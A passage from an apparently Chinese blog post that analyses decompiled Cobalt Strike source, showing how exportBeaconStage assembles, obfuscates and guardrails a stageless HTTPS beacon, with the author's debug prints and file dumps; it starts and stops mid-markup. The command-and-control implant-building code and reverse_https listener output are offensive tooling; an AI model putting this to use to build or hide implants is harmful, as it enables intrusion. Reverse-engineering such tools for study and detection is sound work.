punctuation">&#125;</span></code></pre><p>把上面的位数和system call调用方式传入 </p><pre class="language-java" data-language="java"><code class="language-java">var8<span class="token punctuation">.</span>originalDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportBeaconStage</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>执行结果如下:<br>listener windows&#x2F;beacon_https&#x2F;reverse_https<br/><br>stageless exportBeaconStageHTTP 192.168.1.2 |<br>stageless exportBeaconStageHTTP :| Generating Payload: test – Type: HTTP – Arch: x64 – Exit Function: Process – System <br/>Call: Indirect – HTTP Library: wininet<br/><br>stageless exportBeaconStageHTTP loadDll: resources&#x2F;beacon.x64.dll<br/><br>stageless exportBeaconStage: 443  |192.168.1.2  |false  |true  |resources&#x2F;beacon.x64.dll  |              |false  |<br/></p><p>src&#x2F;beacon&#x2F;BeaconPayload.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">exportBeaconStage</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">,</span> <span class="token class-name">String</span> var6<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStage: "</span> <span class="token operator">+</span>var1<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var2<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var4<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var5<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var6<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var7<span class="token operator">+</span><span class="token string">" |"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> var8 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var10<span class="token operator">=</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//resources/beacon.x64.dll</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span><span class="token string">"原来的stagelessbeacon.x64.dll.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//resources/beacon.x64.dll</span><span class="token comment">//resources/beacon.dll</span><span class="token comment">// sleeve/sleepmask.x86.o</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-get.uri"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">",\\s*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LinkedList</span> var13 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var14 <span class="token operator">&lt;</span> var12<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var14<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>var12<span class="token punctuation">[</span>var14<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var13<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">pick</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var34 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var15 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">getStrategyID</span><span class="token punctuation">(</span>var34<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"rotate"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var15 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"rotate"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var16 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">parseStrategyForNumber</span><span class="token punctuation">(</span>var34<span class="token punctuation">,</span> <span class="token string">"rotate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var17 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var17 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">parseStrategyForNumber</span><span class="token punctuation">(</span>var34<span class="token punctuation">,</span> <span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var18 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"m"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var18 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">parseStrategyForNumber</span><span class="token punctuation">(</span>var34<span class="token punctuation">,</span> <span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>var13<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token punctuation">)</span>var13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var19 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">removeLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token class-name">String</span> var20 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">removeLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">(</span><span class="token string">"dropping "</span> <span class="token operator">+</span> var20 <span class="token operator">+</span> var19 <span class="token operator">+</span> <span class="token string">" from Beacon profile for size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Profile<span class="token punctuation">.</span>SleepAndJitter</span> var35 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getSleep</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var36 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">".tasks_max_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var21 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token string">".http-get.server.output"</span><span class="token punctuation">,</span> var36<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var22 <span class="token operator">|=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var22 <span class="token operator">|=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">BeaconGuardrails</span> var23 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var23 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var23 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Settings</span> var24 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Settings</span><span class="token punctuation">(</span><span class="token number">6144</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> var22<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">var35<span class="token punctuation">.</span></span>SleepInMilliseconds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> var21<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">var35<span class="token punctuation">.</span></span>Jitter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addData</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>publickey<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token punctuation">)</span>var13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">,</span> var15<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">,</span> var16<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">,</span> var17<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> var18<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addData</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">asBinary</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".spawnto"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".post-ex.spawnto_x86"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".post-ex.spawnto_x64"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token class-name">QuickSecurity</span><span class="token punctuation">.</span><span class="token function">getCryptoScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-get.verb"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-post.verb"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">shouldChunkPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">96</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">".watermark"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".watermarkHash"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">option</span><span class="token punctuation">(</span><span class="token string">".stage.cleanup"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">exerciseCFGCaution</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">".stage.data_store_size"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupMaxRetryStrategy</span><span class="token punctuation">(</span>var24<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getMaxRetryStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupDNS</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupHTTP</span><span class="token punctuation">(</span>var24<span class="token punctuation">,</span> var7<span class="token punctuation">,</span> var13<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var25 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getHostHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var25 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> var25<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Profile</span><span class="token punctuation">.</span><span class="token function">usesHostBeacon</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token string">"Host: "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getHostHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Profile</span><span class="token punctuation">.</span><span class="token function">usesCookieBeacon</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">ProxyServer</span> var26 <span class="token operator">=</span> <span class="token class-name">ProxyServer</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getProxyString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var26<span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setupPivotFrames</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">,</span> var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupKillDate</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupGargle</span><span class="token punctuation">(</span>var24<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessInject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>syscallMethod<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var27 <span class="token operator">=</span> var24<span class="token punctuation">.</span><span class="token function">toPatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var28 <span class="token operator">=</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">.</span><span class="token function">quickChecksum</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var23<span class="token punctuation">.</span><span class="token function">setPayloadChecksum</span><span class="token punctuation">(</span>var28 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> <span class="token function">beacon_obfuscate</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithUsername</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithComputer</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithDomain</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithLocalIP</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var29 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//把dll变成字符串</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span><span class="token string">"stagelessbeacondll原来的stagelessbeacon.x64.dll-Two.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// sleep mask</span>var29 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">patchSleepMaskString</span><span class="token punctuation">(</span>var29<span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token 